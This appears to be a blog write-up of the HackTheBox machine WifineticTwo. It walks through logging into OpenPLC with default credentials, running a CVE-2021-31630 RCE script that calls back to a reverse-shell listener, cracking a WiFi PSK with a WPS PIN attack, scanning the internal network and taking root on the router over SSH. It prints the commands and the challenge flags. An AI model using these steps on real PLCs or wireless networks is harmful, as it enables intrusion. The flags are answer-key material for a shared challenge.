---
layout: post
title: WifineticTwo HackTheBox Machine - Writeup
categories: [HackTheBox Machines]
tags: [hackthebox,web,hackthebox medium,linux,wifi]
permalink: /posts/wifinetictwo-htb
image:
  path: /images/htb/medium/wifinetictwo/icon.png
---

I found user quite trivial while root was a bit harder...

**Machine created by:** [felamos](https://app.hackthebox.com/users/27390)

## Recon
I start off my recon by doing a portscan of the IP.

```
$ sudo nmap -p- -T5 10.10.11.7
Starting Nmap 7.94 ( https://nmap.org ) at 2024-04-23 23:27 AEST
...
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
8080/tcp open  http-proxy
```

I visit [10.10.11.7:8080](http://10.10.11.7:8080) and am presented with an OpenPLC login panel.
![login](/images/htb/medium/wifinetictwo/login.png)

## Initial Access

Looking online I find a [forum post](https://openplc.discussion.community/post/cannot-login-with-login-password-11874352) talking about default credentials which work!
![panel](/images/htb/medium/wifinetictwo/panel.png)

## User Flag

Now exploring the capabilities the one of most interest is `Programs` where we are able to upload our own programs, so I look online for any CVEs and find [CVE-2021-31630](https://nvd.nist.gov/vuln/detail/CVE-2021-31630) which seems to be an RCE. I look online for any PoC's and find one directly tied to this box but was a bit surprised about its baked-in political messages (I never expected to encounter this), so I made a [modified PoC](https://github.com/sealldeveloper/CVE-2021-31630-PoC) which has no political messaging and has some typo fixes.

I setup my `pwncat-cs` listener:
```
$ pwncat-cs
...
(local) pwncat$ listen -m linux 4545
new listener created for 0.0.0.0:4545
```

As the script uses `wifinetictwo.htb` as its connection domain, I add that to my `/etc/hosts` and then run the exploit:
```
$ python3 main.py -ip 10 10.16.37 -p 4545 -u openplc -pwd openplc
[+] Logged in successfully.
...
[+] Check your listener.
```

Surely enough we have a connection back.
```
(remote) root@attica04:/root# whoami
root
(remote) root@attica04:/root# cd /root
(remote) root@attica04:/root# cat user.txt
dfdac349088de678885889ec2d12bdd4
```

User Flag: <mark>dfdac349088de678885889ec2d12bdd4</mark>

## Root

Now, this part had me stuck for a bit but the big hint was in the boxes name, **Wifi**.

Running `ifconfig` shows something of interest: a `wlan0` interface, indicating WiFi capabilities!

Now, for hacking it the tool that took *ages* to find was [OneShot](https://github.com/kimocoder/OneShot).

I clone it to my machine, and use a `python3 -m http.server` and `curl` to copy the files across.

I run `python3 oneshot.py -i wlan0` and get a hit:
```
(remote) root@attica04:/root# python3 oneshot.py -i wlan0
[*] Running wpa_supplicant…
[*] BSSID not specified (--bssid) — scanning for available networks
Network marks: Possibly vulnerable | WPS locked | Already stored
Networks list:
#    BSSID              ESSID                     Sec.     PWR  WSC device name             WSC model
1)   02:00:00:00:01:00  plcrouter                 WPA2     -30                                 
Select target (press Enter to refresh): 
```

I enter `1`.
```
Select target (press Enter to refresh): 1
[*] Running wpa_supplicant…
[*] Trying PIN '12345670'…
[*] Scanning…
[*] Authenticating…
[+] Authenticated
[*] Associating with AP…
[+] Associated with 02:00:00:00:01:00 (ESSID: plcrouter)
[*] Received Identity Request
[*] Sending Identity Response…
[*] Received WPS Message M1
[*] Sending WPS Message M2…
[*] Received WPS Message M3
[*] Sending WPS Message M4…
[*] Received WPS Message M5
[+] The first half of the PIN is valid
[*] Sending WPS Message M6…
[*] Received WPS Message M7
[+] WPS PIN: '12345670'
[+] WPA PSK: 'NoWWEDoKnowWhaTisReal123!'
[+] AP SSID: 'plcrouter'
```

Cool! We have the WiFi SSID and password! Now to use them to connect was actually a bit more tricky than expected...
```
(remote) root@attica04:/root# wpa_passphrase plcrouter NoWWEDoKnowWhaTisReal123! > /etc/wpa_supplicant/wpa_supplicant.conf
(remote) root@attica04:/root# sudo wpa_supplicant -B -c /etc/wpa_supplicant/wpa_supplicant.conf -i wlan0
Successfully initialized wpa_supplicant
rfkill: Cannot open RFKILL control device
rfkill: Cannot get wiphy information
nl80211: Could not set interface 'p2p-dev-wlan0' UP
nl80211: deinit ifname=p2p-dev-wlan0 disabled_11b_rates=0
p2p-dev-wlan0: Failed to initialize driver interface
p2p-dev-wlan0: CTRL-EVENT-DSCP-POLICY clear_all
P2P: Failed to enable P2P Device interface
(remote) root@attica04:/root# ifconfig wlan0 192.168.1.254 netmask 255.255.255.0
```

Now that we are connected, let's map the local network with a bash host scan.
```
(remote) root@attica04:/root# for i in {1..254} ;do (ping -c 1 192.168.1.$i | grep "bytes from" &) ;done
64 bytes from 192.168.1.1: icmp_seq=1 ttl=64 time=0.236 ms
64 bytes from 192.168.1.254: icmp_seq=1 ttl=64 time=0.014 ms
```

Alright, let's portscan `192.168.1.1`.
```
(remote) root@attica04:/root# host="192.168.1.1"
(remote) root@attica04:/root# ports=$(seq 1 1024)
(remote) root@attica04:/root# for port in $ports; do timeout 1 nc -zvw1 $host $port &>/dev/null && echo "Port $port is open"; done
Port 22 is open
Port 53 is open
Port 80 is open
Port 443 is open
```

Running `ssh root@192.168.1.1` has no authentication and we are now root!
```
(remote) root@attica04:/root# ssh root@192.168.1.1
...
BusyBox v1.36.1 (2023-11-14 13:38:11 UTC) built-in shell (ash)
...
root@ap:~# cd /root
root@ap:~# cat root.txt
2413b7c18bcb037c6fbaae1cf10ac798
```

Root Flag: <mark>2413b7c18bcb037c6fbaae1cf10ac798</mark>

![Success](/images/htb/medium/iclean/submitted.png)

## Thanks for reading!
Feel free to give me feedback or follow me on [Twitter](https://twitter.com/sealldev) and [LinkedIn](https://www.linkedin.com/in/noah-cooper-5442ab309/).

You can also find my other contacts on the [whoami](../about) page.